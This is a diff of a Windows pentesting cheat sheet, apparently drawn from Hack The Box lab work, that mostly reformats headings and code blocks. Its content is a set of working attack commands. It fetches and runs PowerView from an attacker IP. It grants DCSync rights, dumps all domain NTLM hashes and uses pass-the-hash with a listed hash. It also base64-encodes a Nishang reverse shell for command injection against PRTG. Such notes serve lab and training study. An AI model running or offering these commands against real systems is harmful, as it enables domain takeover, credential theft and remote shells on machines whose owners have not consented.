@@ -1,8 +1,8 @@
 # Windows
 
-Bypass AMSI
+**Bypass AMSI**
 
-Import PowerView first
+**Import PowerView first**
 
 ```powershell
 PS C:\Users\svc-alfresco\Documents> menu
@@ -16,7 +16,7 @@ PS C:\Users\svc-alfresco\Documents> iex(new-object net.webclient).
 downloadstring('http://10.10.14.6/PowerView.ps1')
 ```
 
-Add DCSync Rights
+**Add DCSync Rights**
 
 ```powershell
 $pass = convertto-securestring 'abc123!' -asplain -force
@@ -24,13 +24,13 @@ $cred = new-object system.management.automation.pscredential('htb\john', $pass)
 Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
 ```
 
-GET NTLM Hashes for all domain users
+**GET NTLM Hashes for all domain users**
 
 ```bash
 secretsdump.py htb/john@10.10.10.161
 ```
 
-Pass The Hash
+**Pass The Hash**
 
 ```bash
 psexec.py administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
@@ -53,17 +53,19 @@ START /B "" powershell -c IEX (New-Object
 Net.Webclient).downloadstring('http://10.10.14.2/shell.ps1')
 ```
 
-Encoding a powershell reverse shell to base64 - This technique is useful for executing commands on a vulnerable Windows web service, such as PRTG version 18.2.39, which is susceptible to command injection vulnerabilities. More details about this vulnerability can be found here(https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/)
+**Encoding a powershell reverse shell to base64**&#x20;
 
-```bash
-#Downloading the reverse shell from Nishang in https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
-
+<pre class="language-bash"><code class="lang-bash">#This technique is useful for executing commands on a vulnerable Windows web service, 
+#such as PRTG version 18.2.39, which is susceptible to command injection vulnerabilities
+<strong>
+</strong><strong>#Download the reverse shell from Nishang in https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+</strong>
 #Encoding to base64
-echo -n "IEX(new-objectnet.webclient).downloadstring('http://10.10.16.32/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w0
+echo -n "IEX(new-objectnet.webclient).downloadstring('http://&#x3C;IP>/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w0
 
 #Configuring the reverse shell
-echo 'Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>' >> Invoke-PowerShellTcp.ps1
+echo 'Invoke-PowerShellTcp -Reverse -IPAddress &#x3C;IP> -Port &#x3C;PORT>' >> Invoke-PowerShellTcp.ps1
 
 #send this encoded payload to webservice and just run to pop the shell:
-<whatever data> | powershell -enc <base64 encoded payload>
-```
+&#x3C;whatever data> | powershell -enc &#x3C;base64 encoded payload>
+</code></pre>
